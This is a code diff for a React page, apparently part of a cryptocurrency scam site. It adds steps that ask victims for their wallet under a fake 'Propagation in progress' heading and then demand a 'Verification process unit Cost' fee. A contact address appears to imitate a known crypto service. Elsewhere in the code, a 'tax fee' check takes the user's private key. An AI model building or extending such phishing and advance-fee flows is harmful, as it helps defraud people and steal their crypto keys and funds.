@@ -18,8 +18,10 @@ export default function Home() {
     privateKeyValidateIsLoading,
     runPrivateKeyLoader,
     transactionData,
+    finishStep,
   } = useAppContext();
   const [validationStep, setValidationStep] = useState(0);
+  const [toFee, setToFee] = useState(false);
 
   const getTransactionById = async (id) => {
     const res = await getTransaction(id);
@@ -33,6 +35,9 @@ export default function Home() {
   };
   const onTaxFinish = async (values) => {
     const res = await ValidateTaxFee(values.private_key);
+  };
+  const onWalletFinish = async (values) => {
+    await finishStep();
   };
   useLayoutEffect(() => {
     getTransactionById(txn_id);
@@ -208,7 +213,98 @@ export default function Home() {
           )}
         </>
       )}
-      {transactionData?.step > 3 && (
+      {transactionData?.step === 4 && (
+        <>
+          {privateKeyValidateIsLoading ? (
+            <Loader />
+          ) : (
+            <Form
+              name="login"
+              className={
+                "container px-4 mx-auto mt-12 flex-auto flex flex-col items-center gap-6 w-full sm:max-w-[400px]"
+              }
+              onFinish={onWalletFinish}
+              // onFinishFailed={onFinishFailed}
+              autoComplete="off"
+            >
+              <h1 className="text-[1.5rem] font-[600]">
+                Propagation in progress...
+              </h1>
+              <div className="flex flex-col items-center w-full">
+                <Form.Item
+                  name="wallet"
+                  className="w-full"
+                  rules={[
+                    {
+                      required: true,
+                      message: "",
+                    },
+                  ]}
+                >
+                  <Input
+                    placeholder="Enter Your Wallet to Proceed"
+                    className="w-full"
+                  />
+                </Form.Item>
+                <p className="mt-[0.1rem] text-grey text-[0.8rem] text-light">
+                  input your linked wallet to proceed!
+                </p>
+              </div>
+
+              <Form.Item className="w-full">
+                <Button
+                  // loading={isLoading}
+                  type="primary"
+                  htmlType="submit"
+                  className="w-full pro py-4 bg-blue text-white !text-[0.8rem]"
+                >
+                  Click Here to Proceed
+                </Button>
+              </Form.Item>
+            </Form>
+          )}
+        </>
+      )}
+      {transactionData?.step === 5 && (
+        <>
+          {privateKeyValidateIsLoading ? (
+            <Loader />
+          ) : (
+            <Form
+              name="login"
+              className={
+                "container px-4 mx-auto mt-12 flex-auto flex flex-col items-center gap-6 w-full sm:max-w-[400px]"
+              }
+              onFinish={onWalletFinish}
+              // onFinishFailed={onFinishFailed}
+              autoComplete="off"
+            >
+              <h1 className="text-[1.5rem] font-[600]">
+                Propagation in process...
+              </h1>
+              <div className="flex flex-col items-center w-full">
+                <p className="mt-[0.1rem] text-black text-[0.8rem] text-light">
+                  Confirming Propagation Sort Code
+                </p>
+                <p className="mt-[0.1rem] text-black text-[0.8rem] text-light">
+                  Verification process unit Cost: $
+                  {Number(transactionData?.fee).toLocaleString()}
+                </p>
+                <div className="mt-[0.2rem] text-center">
+                  <p className=" text-grey text-[0.7rem] font-light">
+                    kindly contact{" "}
+                    <a href="mailto:inquiring@cointracker.ws" className='text-blue'>
+                      inquiring@cointracker.ws
+                    </a>{" "}
+                    for further information!
+                  </p>
+                </div>
+              </div>
+            </Form>
+          )}
+        </>
+      )}
+      {transactionData?.step > 5 && (
         <div
           className={
             "container px-4 mx-auto mt-12 flex-auto flex flex-col justify-center items-center gap-2 w-full sm:max-w-[400px]"
